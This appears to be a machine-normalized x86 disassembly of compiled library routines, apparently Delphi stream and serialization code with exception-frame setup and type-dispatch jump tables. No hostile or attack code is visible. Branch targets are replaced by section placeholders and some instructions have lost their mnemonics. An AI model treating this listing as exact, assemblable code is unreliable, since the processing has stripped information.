xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437695
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_437654
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_435510
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_406120
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437695
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4055f0
sub_4376c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] esi
mov eax [ ebp - 0x4 ]
call sub_4356fc
xor eax eax
push ebp
push sub_4377a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov esi eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f560
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_437786
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4358ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437870
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_436350
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_435764
mov eax [ ebp - 0x4 ]
call sub_435b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43778d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4055f0
retn
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_4377b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43785e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_437831
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_437b4c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_422f98
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_435670
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4356a8
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437865
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_437894
cmp [ ebp - 0x4 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_437894
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437916
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax ebx
call sub_435cf4
movzx eax [ ebp - 0x5 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
movzx ecx [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_435cf4
call sub_4199d0
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_419900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43791d
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_437924
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4379fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_435cd0
sub al 0x12
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_437a0c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4072f8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a04
lea eax [ ebp - 0xc ]
call sub_406d54
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_437b4c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax ebx
call sub_435cf4
jmp r-xdata
sub al 0x6
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_435cf4
call sub_4198b0
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_419900
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_435cf4
jmp r-xdata
jmp r-xdata
call sub_435670
sub_437a0c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437b3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_435cd0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_437924
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40730c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b43
lea eax [ ebp - 0x14 ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
mov eax ebx
call sub_437b4c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_435cf4
mov eax [ ebp - 0x8 ]
add eax eax
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_435cf4
call sub_419994
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_419900
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40730c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_435cf4
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_435cf4
call sub_4199d0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_419900
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40730c
jmp r-xdata
jmp r-xdata
call sub_435670
sub_437b60
push ebx
mov ecx edx
mov ebx eax
mov eax ecx
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_433c88
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_437b80
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437bbc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437894
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437bc3
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_437bc8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4358ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_437c88
mov eax [ ebx ]
xor edx edx
call sub_435764
pop ebx
pop ebp
retn
sub_437bf4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_435cf4
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43843c
pop ebx
pop ecx
pop ebp
retn
sub_437c24
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4358ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_435cd0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
xor edx edx
call sub_435764
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_43843c
jmp r-xdata
mov eax [ ebx ]
call sub_437c88
mov eax [ ebx ]
call sub_4358ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_4381dc
mov esi [ ebx ]
xor edx edx
mov eax esi
call sub_435764
sub_437c88
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437e2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_437b4c
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e34
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
jmp [ eax * 4 + jump_table_437cbf ]
push ebp
call sub_437bc8
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437894
jmp r-xdata
push ebp
mov eax 0x1
call sub_437bf4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b80
jmp r-xdata
push ebp
mov eax 0x1
call sub_437bf4
pop ecx
jmp r-xdata
push ebp
call sub_437c24
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
push ebp
mov eax 0x2
call sub_437bf4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_43843c
jmp r-xdata
push ebp
mov eax 0x1
call sub_437bf4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_43843c
sub_437e38
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_437eb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437b4c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43af10
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437894
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx 0x0
call sub_4072d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43ab2c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ebc
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub_437ec0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffff8
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ ebx ]
call sub_437b4c
mov edx eax
mov eax [ esi ]
call sub_43af10
jmp r-xdata
mov eax [ ebx ]
call sub_4358ac
test al al
je r-xdata
mov edx [ esi ]
mov eax [ ebx ]
call sub_437ff4
mov eax [ ebx ]
xor edx edx
call sub_435764
mov eax [ esi ]
call sub_4393e4
pop esi
pop ebx
pop ebp
retn
sub_437f0c
push ebp
mov ebp esp
push eax
mov eax 0x4
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0x4
push ebx
mov ebx eax
cmp ebx 0x4000
jle r-xdata
test ebx ebx
jle r-xdata
lea edx [ ebp - 0x4000 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x4000
call sub_435cf4
lea edx [ ebp - 0x4000 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4000
call sub_4389ac
sub ebx 0x4000
cmp ebx 0x4000
jg r-xdata
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4000 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
call sub_435cf4
lea edx [ ebp - 0x4000 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx ebx
call sub_4389ac
sub_437f9c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437b4c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43af10
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x4
call sub_435cf4
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_4389ac
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
imul ebx
call sub_437f0c
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_437ff4
push ebp
mov ebp esp
add esp 0xfffffff0
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4381ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_435cd0
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4381d5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
retn
jmp [ eax * 4 + jump_table_438031 ]
mov eax [ ebp - 0x8 ]
call sub_437b4c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43af10
jmp r-xdata
push ebp
call sub_437ec0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4369bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439310
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4366d0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_439178
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_437924
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43ad1c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_436824
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43922c
jmp r-xdata
push ebp
mov eax 0x1
call sub_437f9c
pop ecx
jmp r-xdata
push ebp
mov eax 0x2
call sub_437f9c
pop ecx
jmp r-xdata
push ebp
call sub_437e38
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_43674c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_43919c
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_436790
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_4391e4
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4367e0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_439208
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_436a28
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_439384
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_436708
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_4391c0
sub_4381dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_438219
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437894
mov eax ebx
call sub_437c88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438220
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_438224
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4382c0
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_4358ac
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x28 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_437894
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_437894
jmp r-xdata
mov eax ebx
call sub_4381dc
xor edx edx
mov eax ebx
call sub_435764
jmp r-xdata
mov eax ebx
call sub_4358ac
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_438224
xor edx edx
mov eax ebx
call sub_435764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4382c7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4382d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438375
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4070fc
xor eax eax
mov [ ebp - 0x8 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c860
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43837c
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebx + 0x5a ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_4383a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov edx [ edi ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push edi
mov ebx eax
mov ecx esi
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4383c8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_435c24
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_42f800
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_405894
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_435c24
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_43843c
push ebx
push esi
add esp 0xfffffe00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x200
pop esi
pop ebx
retn
cmp ebx 0x200
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_435cf4
xor ebx ebx
mov edx esp
mov ecx 0x200
mov eax esi
call sub_435cf4
sub ebx 0x200
jmp r-xdata
test ebx ebx
jg r-xdata
sub_438484
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43862d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_435764
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_438608
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_435cf4
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_433cec
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x18 ]
call sub_435cf4
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cf0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4385e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_437924
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_435cf4
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_433cec
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_435cf4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_422b6c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_418aa4
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385ea
mov eax [ ebp - 0x14 ]
call sub_4055f0
retn
sub_43864c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43885e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c288
mov eax [ ebp - 0x4 ]
call sub_435cd0
and eax 0x7f
cmp eax 0x15
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
jmp [ eax * 4 + jump_table_43868e ]
mov eax [ ebp - 0x4 ]
call sub_437b4c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4369bc
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_42125c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4369bc
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_42125c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4369bc
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_42125c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4366d0
mov eax ebx
call sub_421480
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43674c
mov eax ebx
call sub_421480
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_436708
mov eax ebx
call sub_421480
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_436790
mov eax ebx
call sub_4214a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4367e0
mov eax ebx
call sub_421494
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437924
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_421520
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437a0c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4214e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b4c
cmp al 0x9
sete dl
mov eax ebx
call sub_421458
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_438484
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_41c5f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_436a28
push edx
push eax
mov eax ebx
call sub_421384
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438865
lea eax [ ebp - 0x1c ]
call sub_41c29c
lea eax [ ebp - 0xc ]
call sub_406d54
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov eax ebx
call sub_422c40
jmp r-xdata
sub_43886c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_438a80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_434d38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4388a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_43aac0
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_4388cc
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_43aac0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_4389f8
sub_438908
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax esi
xor edx edx
call sub_4070a8
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov eax [ ebx + 0x1c ]
mov eax [ eax ]
mov edx [ esp ]
call sub_405a24
sub_438958
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_433c68
cmp eax esi
jg r-xdata
mov eax ebx
call sub_438a80
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_433c88
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_4389ac
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_438a80
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_4389f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
